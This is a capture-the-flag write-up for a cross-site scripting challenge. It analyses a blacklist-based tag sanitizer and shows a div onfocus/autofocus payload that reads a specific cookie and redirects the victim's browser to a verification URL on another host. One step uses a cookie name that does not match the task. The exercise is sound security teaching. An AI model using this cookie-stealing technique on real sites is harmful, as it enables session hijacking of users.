# Mission 5 ~ cross site scripting


## Goal and instructions

[Game of Apulia](https://web6.chall.necst.it/) is the latest strategic, medieval game set in Puglia, Italy. Developed by Tarantella Tech, it pushes the boundaries of what it means to play videogames in 2024. Coming soon on PC, PS4, PS5, Xbox Series S and X, Nintendo Switch.

To validate your solution, please submit an URL belonging to the domain `web6.chall.necst.it`, which, when opened in a browser:
- retrieves the value of cookie `JxNHT`, which is is already present in the cookie jar of the browser that will visit your URL (the developers were sloppy, and this cookie is not `HTTPOnly`). Pay attention to the fact that there are multiple cookies in the cookie jar: you need to submit only the value of `JxNHT`!
- submits it through a `GET` request to `https://chall.necst.it/challenges/web6/verify/[PERSONA_CODE]/[cookie]`, where `[cookie]` is the value of the cookie `JxNHT`

For example, if `document.cookie` is `JxNHT=th1s1ssupersecret`, your payload must perform a `GET` request to: `https://chall.necst.it/challenges/web6/verify/[PERSONA_CODE]/th1s1ssupersecret`.

If you are encountering issues with your payload, please notice that the administrators' browser is **already logged** in to https://chall.necst.it/, and that it actually needs to be logged in to submit a valid solution. Basically, you are also exploiting an intentional CSRF vulnerability in https://chall.necst.it/!


## Web app structure

The website has a home page, a game explanaition page, a blog page and a contact us page.


## Code overview

Examining the source code, it can be seen that the `sanitize(string)` function cleans a string by verifying that it does not contain blacklisted words.
```php
def sanitize(string):
    # Who the hell says blacklists are bad? Amateurs. Real pros use blacklists.
    # This is to let you know that blacklists are not always bad. They can be useful in some cases.
    # Here, we are using a blacklist to remove any suspicious tags from the input string.
    blacklist = ['fieldset', 'track', 'th', 'legend', 'datalist', 'button', 'details',
                 'tr', 'template', 'meta', 'label', 'noscript', 'header', 'frame', 'table',
                 'audio', 'tfoot', 'optgroup', 'footer', 'dialog', 'body', 'command', 'tbody',
                 'article', 'blockquote', 'confirm', 'link', 'svg', 'output', 'meter', 'applet',
                 'select', 'script', 'canvas', 'caption', 'thead', 'colgroup', 'form',
                 'img', 'image', 'slot', 'main', 'option', 'embed', 'iframe', 'map', 'object', 'summary',
                 'col', 'textarea', 'td', 'aside', 'section', 'address', 'marquee', 'input',
                 'video', 'nav', 'prompt', 'style', 'menu', 'area', 'progress']

    # Create a regex pattern to match any tags or suspicious patterns
    pattern = '|'.join(['<' + word + '.*>' for word in blacklist])

    # Recursively remove any tags or suspicious patterns
    while re.search(pattern, string, re.IGNORECASE):
        string = re.sub(pattern, '', string, flags=re.IGNORECASE)

    # Also blacklist javascript:
    string = re.sub(r'javascript:', 'javascript', string, flags=re.IGNORECASE)

    return string
```

If you read the blacklist carefully, you can see that **div** is one of the HTML tags that are not in the blacklist.
```php
blacklist = ['fieldset', 'track', 'th', 'legend', 'datalist', 'button', 'details',
                 'tr', 'template', 'meta', 'label', 'noscript', 'header', 'frame', 'table',
                 'audio', 'tfoot', 'optgroup', 'footer', 'dialog', 'body', 'command', 'tbody',
                 'article', 'blockquote', 'confirm', 'link', 'svg', 'output', 'meter', 'applet',
                 'select', 'script', 'canvas', 'caption', 'thead', 'colgroup', 'form',
                 'img', 'image', 'slot', 'main', 'option', 'embed', 'iframe', 'map', 'object', 'summary',
                 'col', 'textarea', 'td', 'aside', 'section', 'address', 'marquee', 'input',
                 'video', 'nav', 'prompt', 'style', 'menu', 'area', 'progress']
```


## Solution

To complete the exploit, you need to follow the following steps:

1. Determine how to get the required cookie.
   ```javascript
   document.cookie.split(';').map((c) => c.trim()).filter((c) => c.split('=')[0] == 'aNrBwXC').map((c) => c.split('=')[1])[0]
   ```
2. Determine which HTML attributes it is possible to use in the `div` tag and can be useful for exploitation.
    - `onfocus`
    - `autofocus`
    - `contenteditable`
      
3. Write the tag with the correct attributes to perform the exploit.
   ```html
   <div contenteditable onfocus="window.location.replace('https://chall.necst.it/challenges/web6/verify/5682/'.concat(document.cookie.split(';').map((c) => c.trim()).filter((c) => c.split('=')[0] == 'JxNHT').map((c) => c.split('=')[1])[0]))" autofocus>
   ```
4. Enter the previously written tag in the comment to be blogged, copy the url and enter it into the verification platform.
   ```https
   https://web6.chall.necst.it/comment/[COMMENT_NUMBER]
   ```
   > **note:** if the comment url is not shown, you need to disable scripts (it is suggested to install an extension to disable scripts such as NoScript)
   
